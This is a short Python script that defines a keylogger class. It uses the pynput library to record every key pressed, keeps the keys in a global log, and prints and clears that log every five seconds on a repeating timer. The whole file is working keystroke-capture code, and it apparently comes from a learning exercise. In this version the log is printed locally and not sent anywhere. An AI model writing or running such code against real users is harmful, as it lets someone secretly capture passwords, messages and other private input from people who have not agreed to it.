#!/usr/bin/env python
import pynput.keyboard
import threading

log = ""


class Keylogger:

    def process_key_press(self, key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "
    # in here you are converting key to char and if its special character like space it wont convert it to char to not have error
        # print(log)

    def report(self):
        global log
        print(log)
        log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

